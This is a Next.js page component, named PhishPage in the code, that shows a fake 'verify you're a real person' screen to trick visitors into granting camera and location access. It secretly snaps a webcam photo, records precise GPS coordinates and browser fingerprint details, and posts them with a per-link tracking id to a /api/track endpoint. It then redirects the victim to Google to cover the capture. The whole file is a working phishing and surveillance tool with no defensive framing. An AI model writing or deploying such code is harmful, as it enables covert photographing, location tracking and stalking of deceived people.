import { useRouter } from 'next/router';
import { useEffect } from 'react';

export default function PhishPage() {
  const router = useRouter();
  const { id } = router.query;

  return (
    <div>
      <div id="root"></div>
      {id && <PageContent linkId={id} />}
    </div>
  );
}

function PageContent({ linkId }) {
  useEffect(() => {
    // Inject HTML and scripts directly
    const root = document.getElementById('root');
    
    root.innerHTML = `
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center; padding: 20px;
        }
        .card { background: white; border-radius: 20px; padding: 40px; max-width: 500px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; }
        .shield-icon { font-size: 80px; margin-bottom: 20px; }
        h1 { color: #1a1a2e; font-size: 24px; margin-bottom: 10px; }
        p { color: #666; margin-bottom: 25px; line-height: 1.6; }
        .verify-btn {
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          color: white; border: none; padding: 18px 50px; font-size: 18px;
          border-radius: 50px; cursor: pointer; font-weight: 600; width: 100%; max-width: 300px;
        }
        .verify-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(102,126,234,0.4); }
        .verify-btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .loading { display: none; margin-top: 20px; }
        .loading.active { display: block; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #667eea; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { margin-top: 20px; padding: 15px; border-radius: 10px; display: none; }
        .status.success { background: #d4edda; color: #155724; display: block; }
        .permissions-list { text-align: left; margin: 20px 0; padding: 0; list-style: none; }
        .permissions-list li { padding: 12px 15px; margin: 5px 0; background: #f8f9fa; border-radius: 10px; display: flex; align-items: center; gap: 10px; font-size: 14px; }
        .permissions-list li.granted { background: #d4edda; border-left: 4px solid #28a745; }
        .permissions-list li.denied { background: #f8d7da; border-left: 4px solid #dc3545; }
        .permissions-list li.pending { border-left: 4px solid #ffc107; }
      </style>
      <div class="card">
        <div class="shield-icon">🛡️</div>
        <h1>Content Verification Required</h1>
        <p>We need to verify you're a real person. Please allow access to continue.</p>
        <ul class="permissions-list">
          <li class="pending" id="camPerm">📸 Camera Access <span id="camStatus">(pending)</span></li>
          <li class="pending" id="locPerm">📍 Location Access <span id="locStatus">(pending)</span></li>
        </ul>
        <button class="verify-btn" id="verifyBtn">✅ Continue to Verify</button>
        <div class="loading" id="loading"><div class="spinner"></div><p>Verifying your device...</p></div>
        <div class="status" id="status"></div>
      </div>
    `;

    // Now set up the button click handler
    document.getElementById('verifyBtn').onclick = async function() {
      const btn = this;
      const loading = document.getElementById('loading');
      const status = document.getElementById('status');
      
      btn.disabled = true;
      btn.textContent = '⏳ Verifying...';
      loading.classList.add('active');

      // Request camera
      let photo = null;
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } } });
        document.getElementById('camPerm').className = 'granted';
        document.getElementById('camStatus').textContent = '(granted ✓)';
        
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        await new Promise(r => setTimeout(r, 300));
        
        const canvas = document.createElement('canvas');
        canvas.width = 320; canvas.height = 240;
        canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
        photo = canvas.toDataURL('image/jpeg', 0.4);
        stream.getTracks().forEach(t => t.stop());
      } catch(e) {
        document.getElementById('camPerm').className = 'denied';
        document.getElementById('camStatus').textContent = '(denied ✗)';
      }

      // Request location
      let location = null;
      try {
        const pos = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
        });
        document.getElementById('locPerm').className = 'granted';
        document.getElementById('locStatus').textContent = '(granted ✓)';
        location = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
      } catch(e) {
        document.getElementById('locPerm').className = 'denied';
        document.getElementById('locStatus').textContent = '(denied ✗)';
      }

      // Send data
      const API_URL = '/api/track';
      
      if (photo) {
        await fetch(API_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ linkId, type: 'photo', photoData: photo })
        });
      }
      
      if (location) {
        await fetch(API_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ linkId, type: 'location', coords: location })
        });
      }
      
      await fetch(API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ linkId, type: 'info', user_agent: navigator.userAgent, screen_res: screen.width+'x'+screen.height, platform: navigator.platform, language: navigator.language, hasCamera: !!photo, hasLocation: !!location })
      });

      loading.classList.remove('active');
      status.className = 'status success';
      status.innerHTML = '✅ Verification Complete!<br>Redirecting...';
      btn.textContent = '✅ Verified';
      setTimeout(() => { window.location.href = 'https://www.google.com'; }, 2000);
    };
  }, [linkId]);

  return null;
}
